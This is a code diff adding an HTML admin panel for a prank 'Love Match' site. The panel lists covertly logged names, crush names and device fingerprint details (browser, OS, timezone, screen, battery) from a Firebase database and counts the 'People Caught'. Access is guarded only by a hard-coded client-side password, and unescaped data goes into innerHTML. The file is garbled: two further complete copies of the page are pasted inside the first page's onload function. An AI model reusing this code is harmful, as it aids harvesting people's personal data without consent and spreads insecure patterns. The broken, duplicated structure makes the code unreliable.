@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Viewer 💻</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #0f0;
+      padding: 20px;
+    }
+    h1 {
+      text-align: center;
+      color: #0f0;
+    }
+    #logCount {
+      text-align: center;
+      font-size: 1.2em;
+      margin-top: 10px;
+      color: #0f0;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      border: 1px solid #0f0;
+      padding: 8px;
+      text-align: left;
+    }
+    th {
+      background-color: #222;
+    }
+    .delete-btn {
+      color: red;
+      cursor: pointer;
+      font-weight: bold;
+    }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyA9SDmpeyc5k9iraz8KXlZD4wRXGYSM1_w",
+      authDomain: "hacker-login-5da91.firebaseapp.com",
+      databaseURL: "https://hacker-login-5da91-default-rtdb.firebaseio.com",
+      projectId: "hacker-login-5da91",
+      storageBucket: "hacker-login-5da91.firebasestorage.app",
+      messagingSenderId: "1046375390326",
+      appId: "1:1046375390326:web:56c01ddefd415b045d1357",
+      measurementId: "G-614SQHSVQD"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function promptPassword() {
+      const pass = prompt("Enter Admin Password:");
+      if (pass !== "PRANKED") {
+        alert("Incorrect password. Access denied.");
+        document.body.innerHTML = "<h1>🔒 Access Denied</h1>";
+      }
+    }
+
+    function loadLogs() {
+      const table = document.getElementById("logs");
+      const countText = document.getElementById("logCount");
+      db.ref("loveLogs").on("value", snapshot => {
+        let count = 0;
+        table.innerHTML = "<tr><th>Your Name</th><th>Crush Name</th><th>Time</th><th>Device</th><th>Browser</th><th>OS</th><th>Delete</th></tr>";
+        snapshot.forEach(log => {
+          const data = log.val();
+          const key = log.key;
+          const row = `<tr>
+            <td>${data.yourName || ''}</td>
+            <td>${data.crushName || ''}</td>
+            <td>${data.time || ''}</td>
+            <td>${data.device || ''}</td>
+            <td>${data.browser || ''}</td>
+            <td>${data.os || ''}</td>
+            <td><span class='delete-btn' onclick='deleteEntry("${key}")'>🗑️</span></td>
+          </tr>`;
+          table.innerHTML += row;
+          count++;
+        });
+        countText.innerHTML = `👥 Total People Caught: ${count}`;
+      });
+    }
+
+    function deleteEntry(key) {
+      if (confirm("Delete this entry?")) {
+        db.ref("loveLogs/" + key).remove();
+      }
+    }
+
+    window.onload = function() {<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Viewer 💻</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #0f0;
+      padding: 20px;
+    }
+    h1 {
+      text-align: center;
+      color: #0f0;
+    }
+    #logCount {
+      text-align: center;
+      font-size: 1.2em;
+      margin-top: 10px;
+      color: #0f0;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      border: 1px solid #0f0;
+      padding: 8px;
+      text-align: left;
+    }
+    th {
+      background-color: #222;
+    }
+    .delete-btn {
+      color: red;
+      cursor: pointer;
+      font-weight: bold;
+    }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyA9SDmpeyc5k9iraz8KXlZD4wRXGYSM1_w",
+      authDomain: "hacker-login-5da91.firebaseapp.com",
+      databaseURL: "https://hacker-login-5da91-default-rtdb.firebaseio.com",
+      projectId: "hacker-login-5da91",
+      storageBucket: "hacker-login-5da91.firebasestorage.app",
+      messagingSenderId: "1046375390326",
+      appId: "1:1046375390326:web:56c01ddefd415b045d1357",
+      measurementId: "G-614SQHSVQD"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function promptPassword() {
+      const pass = prompt("Enter Admin Password:");
+      if (pass !== "PRANKED") {
+        alert("Incorrect password. Access denied.");
+        document.body.innerHTML = "<h1>🔒 Access Denied</h1>";
+      }
+    }
+
+    function loadLogs() {
+      const table = document.getElementById("logs");
+      const countText = document.getElementById("logCount");
+      db.ref("loveLogs").on("value", snapshot => {
+        let count = 0;
+        table.innerHTML = "<tr><th>Your Name</th><th>Crush Name</th><th>Time</th><th>Device</th><th>Browser</th><th>OS</th><th>Timezone</th><th>Language</th><th>Screen</th><th>Battery</th><th>Delete</th></tr>";
+        snapshot.forEach(log => {
+          const data = log.val();
+          const key = log.key;
+          const row = `<tr>
+            <td>${data.yourName || ''}</td>
+            <td>${data.crushName || ''}</td>
+            <td>${data.time || ''}</td>
+            <td>${data.device || ''}</td>
+            <td>${data.browser || ''}</td>
+            <td>${data.os || ''}</td>
+            <td>${data.timezone || ''}</td>
+            <td>${data.language || ''}</td>
+            <td>${data.screen || ''}</td>
+            <td>${data.battery || ''}</td>
+            <td><span class='delete-btn' onclick='deleteEntry("${key}")'>🗑️</span></td>
+          </tr>`;
+          table.innerHTML += row;
+          count++;
+        });
+        countText.innerHTML = `👥 Total People Caught: ${count}`;
+      });
+    }
+
+    function deleteEntry(key) {
+      if (confirm("Delete this entry?")) {
+        db.ref("loveLogs/" + key).remove();
+      }
+    }
+
+    window.onload = function() {
+      promptPassword();
+      loadLogs();
+    };
+  </script>
+</head>
+<body>
+  <h1>💘 Love Match Logs - Admin Panel 💘</h1>
+  <div id="logCount"></div>
+  <table id="logs"></table>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Viewer 💻</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #0f0;
+      padding: 20px;
+    }
+    h1 {
+      text-align: center;
+      color: #0f0;
+    }
+    #logCount {
+      text-align: center;
+      font-size: 1.2em;
+      margin-top: 10px;
+      color: #0f0;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      border: 1px solid #0f0;
+      padding: 8px;
+      text-align: left;
+    }
+    th {
+      background-color: #222;
+    }
+    .delete-btn {
+      color: red;
+      cursor: pointer;
+      font-weight: bold;
+    }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyA9SDmpeyc5k9iraz8KXlZD4wRXGYSM1_w",
+      authDomain: "hacker-login-5da91.firebaseapp.com",
+      databaseURL: "https://hacker-login-5da91-default-rtdb.firebaseio.com",
+      projectId: "hacker-login-5da91",
+      storageBucket: "hacker-login-5da91.firebasestorage.app",
+      messagingSenderId: "1046375390326",
+      appId: "1:1046375390326:web:56c01ddefd415b045d1357",
+      measurementId: "G-614SQHSVQD"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function promptPassword() {
+      const pass = prompt("Enter Admin Password:");
+      if (pass !== "PRANKED") {
+        alert("Incorrect password. Access denied.");
+        document.body.innerHTML = "<h1>🔒 Access Denied</h1>";
+      }
+    }
+
+    function loadLogs() {
+      const table = document.getElementById("logs");
+      const countText = document.getElementById("logCount");
+      db.ref("loveLogs").on("value", snapshot => {
+        let count = 0;
+        table.innerHTML = "<tr><th>Your Name</th><th>Crush Name</th><th>Time</th><th>Device</th><th>Browser</th><th>OS</th><th>Timezone</th><th>Language</th><th>Screen</th><th>Battery</th><th>Delete</th></tr>";
+        snapshot.forEach(log => {
+          const data = log.val();
+          const key = log.key;
+          const row = `<tr>
+            <td>${data.yourName || ''}</td>
+            <td>${data.crushName || ''}</td>
+            <td>${data.time || ''}</td>
+            <td>${data.device || ''}</td>
+            <td>${data.browser || ''}</td>
+            <td>${data.os || ''}</td>
+            <td>${data.timezone || ''}</td>
+            <td>${data.language || ''}</td>
+            <td>${data.screen || ''}</td>
+            <td>${data.battery || ''}</td>
+            <td><span class='delete-btn' onclick='deleteEntry("${key}")'>🗑️</span></td>
+          </tr>`;
+          table.innerHTML += row;
+          count++;
+        });
+        countText.innerHTML = `👥 Total People Caught: ${count}`;
+      });
+    }
+
+    function deleteEntry(key) {
+      if (confirm("Delete this entry?")) {
+        db.ref("loveLogs/" + key).remove();
+      }
+    }
+
+    window.onload = function() {
+      promptPassword();
+      loadLogs();
+    };
+  </script>
+</head>
+<body>
+  <h1>💘 Love Match Logs - Admin Panel 💘</h1>
+  <div id="logCount"></div>
+  <table id="logs"></table>
+</body>
+</html>
+
+      promptPassword();
+      loadLogs();
+    };
+  </script>
+</head>
+<body>
+  <h1>💘 Love Match Logs - Admin Panel 💘</h1>
+  <div id="logCount"></div>
+  <table id="logs"></table>
+</body>
+</html>
